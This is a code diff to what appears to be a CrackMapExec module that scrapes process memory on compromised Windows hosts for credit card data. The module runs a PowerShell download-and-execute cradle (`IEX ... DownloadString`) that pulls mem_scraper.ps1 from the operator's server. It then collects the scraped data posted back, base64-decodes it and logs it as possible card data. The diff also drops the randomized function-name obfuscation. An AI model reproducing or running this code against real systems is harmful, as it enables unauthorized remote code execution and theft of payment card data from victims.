@@ -1,4 +1,5 @@
-from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log, gen_random_string
+from base64 import b64decode
+from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
 from StringIO import StringIO
 from datetime import datetime
 from sys import exit
@@ -29,22 +30,24 @@ class CMEModule:
         if 'PROC' in module_options:
             self.process = module_options['PROC']
 
-        self.obfs_name = gen_random_string()
+            if self.process.endswith('.exe'):
+                self.process = self.process[:-4]
+
+        context.log.info('This module will not exit automatically, it will continue to run until CTRL-C is detected')
 
     def on_admin_login(self, context, connection):
 
         payload = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/mem_scraper.ps1');
-        Invoke-{func_name} -DumpFilePath %SystemRoot%\Temp -Proc {process} -LogUrl {server}://{addr}:{port}
+        Invoke-MemScraper -Proc {process} -LogUrl {server}://{addr}:{port}
         '''.format(server=context.server,  
                   port=context.server_port, 
                   addr=context.localip,
-                  process=self.process,
-                  func_name=self.obfs_name)
+                  process=self.process)
 
         context.log.debug('Payload: {}'.format(payload))
         payload = create_ps_command(payload)
-        connection.execute(payload, methods=['atexec', 'smbexec'])
+        connection.execute(payload)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
@@ -53,7 +56,7 @@ class CMEModule:
             request.end_headers()
 
             with open(get_ps_script('mem_scraper.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
+                ps_script = obfs_ps_script(ps_script.read())
                 request.wfile.write(ps_script)
 
         else:
@@ -67,11 +70,19 @@ class CMEModule:
         data = response.rfile.read(length)
 
         if len(data):
+
             def print_post_data(data):
                 buf = StringIO(data.strip()).readlines()
                 for line in buf:
                     context.log.highlight(line.strip())
 
+            try:
+                data = b64decode(data)
+            except:
+                print_post_data(data)
+                return
+
+            context.log.success('Found possible credit card data')
             print_post_data(data)
 
             log_name = 'MemScraper-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
